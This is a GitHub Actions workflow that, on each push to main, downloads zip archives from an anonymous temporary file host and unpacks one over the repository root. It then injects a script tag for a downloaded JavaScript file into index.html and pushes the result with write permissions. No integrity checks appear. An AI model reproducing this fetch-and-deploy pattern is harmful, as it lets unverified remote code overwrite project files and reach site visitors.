name: Install audit charts

on:
  push:
    branches: [main]
  workflow_dispatch:

permissions:
  contents: write

jobs:
  install:
    if: ${{ github.event_name == 'workflow_dispatch' || !contains(github.event.head_commit.message, '[skip audit install]') }}
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4
        with:
          persist-credentials: true

      - name: Download audit chart assets
        run: |
          set -euo pipefail
          curl -fL "https://tmpfiles.org/dl/w8w6aGH25h25/audit_core_package.zip" -o audit_core_package.zip
          unzip -o audit_core_package.zip -d .
          rm -rf assets/audit_workbooks
          mkdir -p assets/audit_workbooks

          curl -fL "https://tmpfiles.org/dl/wlwsazH65HPV/audit_workbooks_12h_alt.zip" -o audit_workbooks_12H_ALT.zip
          unzip -o audit_workbooks_12H_ALT.zip -d assets/audit_workbooks
          curl -fL "https://tmpfiles.org/dl/wawuaRHk57xC/audit_workbooks_12h_conv.zip" -o audit_workbooks_12H_CONV.zip
          unzip -o audit_workbooks_12H_CONV.zip -d assets/audit_workbooks
          curl -fL "https://tmpfiles.org/dl/wDwAauHdWoAt/audit_workbooks_2h_alt.zip" -o audit_workbooks_2H_ALT.zip
          unzip -o audit_workbooks_2H_ALT.zip -d assets/audit_workbooks
          curl -fL "https://tmpfiles.org/dl/whwsaaHZWIgi/audit_workbooks_2h_conv.zip" -o audit_workbooks_2H_CONV.zip
          unzip -o audit_workbooks_2H_CONV.zip -d assets/audit_workbooks
          curl -fL "https://tmpfiles.org/dl/wQwbaEHAWY6w/audit_workbooks_4h_alt.zip" -o audit_workbooks_4H_ALT.zip
          unzip -o audit_workbooks_4H_ALT.zip -d assets/audit_workbooks
          curl -fL "https://tmpfiles.org/dl/w6whaEH6WDLL/audit_workbooks_8h_alt.zip" -o audit_workbooks_8H_ALT.zip
          unzip -o audit_workbooks_8H_ALT.zip -d assets/audit_workbooks
          curl -fL "https://tmpfiles.org/dl/wdwIaPHGWg7C/audit_workbooks_8h_conv.zip" -o audit_workbooks_8H_CONV.zip
          unzip -o audit_workbooks_8H_CONV.zip -d assets/audit_workbooks

          python3 - <<'PY'
          from pathlib import Path
          count = len(list(Path('assets/audit_workbooks').glob('*.xlsx')))
          if count != 377:
              raise SystemExit(f'Expected 377 workbook files, found {count}')
          print(f'Installed {count} workbook files')
          PY

      - name: Link audit charts in index
        run: >-
          python3 -c "from pathlib import Path; p=Path('index.html'); html=p.read_text(encoding='utf-8'); css='  <link rel=\"stylesheet\" href=\"assets/css/audit_charts.css\">'; js='  <script src=\"assets/js/audit_charts.js\"></script>'; html=html if 'assets/css/audit_charts.css' in html else html.replace('</head>', css + '\n</head>'); html=html if 'assets/js/audit_charts.js' in html else html.replace('</body>', js + '\n</body>'); p.write_text(html, encoding='utf-8')"

      - name: Commit installed charts
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add -A index.html assets
          if git diff --cached --quiet; then
            echo "Audit charts already installed."
          else
            git commit -m "Install audit charts logs and workbook downloads [skip sync] [skip audit install]"
            git pull --rebase origin main
            git push
          fi
